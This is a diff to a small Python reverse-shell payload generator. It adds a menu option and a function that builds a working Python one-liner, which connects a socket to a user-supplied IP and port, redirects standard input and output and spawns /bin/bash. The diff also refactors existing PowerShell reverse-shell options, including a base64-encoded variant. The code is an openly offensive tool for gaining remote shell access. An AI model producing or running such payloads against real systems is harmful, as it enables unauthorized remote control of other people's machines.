@@ -1,5 +1,19 @@
 import base64
 
+def print_payload(payload):
+    print("============================================================================")
+    print(payload)
+    print("============================================================================")
+
+def python_shell():
+    print("Selected Python!")
+    ip = input("Local Host IP: ")
+    port = input("Local Host Port: ")
+    payload = f"python -c \'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\'"
+
+    print("Generating Python Reverse Shell...")
+    print_payload(payload)
+
 def reversepwsh():
     ip = input("Local Host IP: ")
     port = input("Local Host Port: ")
@@ -14,7 +28,7 @@ def reversepwsh():
     return payload
 
 def powershell():
-    print("Using powershell option...")
+    print("Selected Powershell!")
     print("1. Reverse Shell")
     print("2. Reverse Shell (base64 encoded)")
     payload = "No option chosen!"
@@ -34,17 +48,18 @@ def powershell():
     else:
         print("nah bro")
     
-    print("======================================")
-    print(payload)
-    print("======================================")
+    print_payload(payload)
 
 def loop():
     print("Payload Options:")
     print("1. Powershell")
+    print("2. Python")
     option = input("Enter option number: ")
 
     if option == '1':
         powershell()
+    elif option == '2':
+        python_shell()
     else:
         print("Unsupported option!")
 
